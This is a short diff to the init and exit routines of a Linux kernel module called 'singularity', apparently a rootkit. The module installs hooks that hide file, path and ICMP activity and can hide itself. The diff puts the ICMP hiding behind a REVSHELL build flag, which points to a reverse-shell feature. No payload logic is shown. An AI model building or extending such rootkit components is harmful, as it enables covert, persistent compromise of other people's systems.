@@ -35,8 +35,10 @@ static int __init singularity_init(void) {
     ret |= hiding_chdir_init();
     ret |= hiding_readlink_init();
     ret |= bpf_hook_init();
-    ret |= hiding_icmp_init();
     ret |= trace_pid_init();
+#ifdef REVSHELL
+    ret |= hiding_icmp_init();
+#endif
 #ifdef HIDE_MODULE
     module_hide_current(); // optional
 #endif
@@ -56,8 +58,10 @@ static void __exit singularity_exit(void) {
     hiding_readlink_exit();
     hiding_open_exit();
     bpf_hook_exit();
-    hiding_icmp_exit();
     trace_pid_cleanup();
+#ifdef REVSHELL
+    hiding_icmp_exit();
+#endif
 }
 
 module_init(singularity_init);
